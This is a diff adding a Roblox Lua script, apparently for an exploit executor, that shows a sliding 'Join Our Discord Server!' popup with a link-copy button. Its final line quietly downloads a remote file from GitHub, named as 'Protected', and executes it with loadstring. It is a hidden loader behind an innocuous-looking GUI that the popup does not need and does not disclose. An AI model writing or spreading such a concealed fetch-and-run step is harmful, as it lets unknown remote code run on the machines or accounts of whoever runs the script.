@@ -1,0 +1,86 @@
+local gui = Instance.new("ScreenGui")
+gui.Name = "DiscordInviteGui"
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui")
+
+local TweenService = game:GetService("TweenService")
+
+local function createInstance(className, properties)
+    local obj = Instance.new(className)
+    for prop, value in pairs(properties) do
+        obj[prop] = value
+    end
+    return obj
+end
+
+local slideDuration = math.random(15, 25) / 5
+
+local mainFrame = createInstance("Frame", {
+    Size = UDim2.new(0, 250, 0, 240),
+    Position = UDim2.new(0.5, -125, 0.5, -120),
+    BackgroundColor3 = Color3.fromRGB(64, 67, 73),
+    Parent = gui,
+})
+
+createInstance("UICorner", { Parent = mainFrame })
+createInstance("UIStroke", {
+    ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+    Color = Color3.fromRGB(40, 43, 48),
+    Thickness = 4,
+    Parent = mainFrame,
+})
+
+mainFrame.Position = UDim2.new(-1, 0, 0.5, -120)
+TweenService:Create(mainFrame, TweenInfo.new(slideDuration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -125, 0.5, -120)}):Play()
+
+local title = createInstance("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 38),
+    Position = UDim2.new(0, 0, 0, 5),
+    BackgroundTransparency = 1,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    Font = Enum.Font["Highway"],
+    TextSize = 24,
+    TextScaled = true,
+    Text = "Join Our Discord Server!",
+    Parent = mainFrame,
+})
+
+local imageDisplay = createInstance("ImageLabel", {
+    Size = UDim2.new(0, 150, 0, 100),
+    Position = UDim2.new(0.6, -100, 0.5, -60),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://87615026713140",
+    Parent = mainFrame,
+})
+
+local buttonsData = {
+    { text = "Copy Link", position = UDim2.new(0.8, -70, 1, -50), action = function() setclipboard("https://discord.gg/hnq9AGVMwq") end },
+    { text = "Nope", position = UDim2.new(0.35, -70, 1, -50), action = function()
+        gui:Destroy()
+    end },
+}
+
+for _, btnData in ipairs(buttonsData) do
+    local button = createInstance("TextButton", {
+        Size = UDim2.new(0, 100, 0, 40),
+        Position = btnData.position,
+        BackgroundColor3 = (btnData.text == "Copy Link" and Color3.fromRGB(114, 137, 218) or Color3.fromRGB(70, 73, 78)),
+        TextColor3 = Color3.fromRGB(0, 0, 0),
+        Font = Enum.Font["Highway"],
+        TextScaled = true,
+        Text = btnData.text,
+        Parent = mainFrame,
+    })
+
+    createInstance("UICorner", { Parent = button })
+    createInstance("UIStroke", {
+        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+        Color = (btnData.text == "Copy Link" and Color3.fromRGB(90, 105, 140) or Color3.fromRGB(50, 53, 58)),
+        Thickness = 4,
+        Parent = button,
+    })
+
+    button.MouseButton1Click:Connect(btnData.action)
+end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/aabbaaii13/Gui/refs/heads/main/Protected_7979444196103730.txt'))()
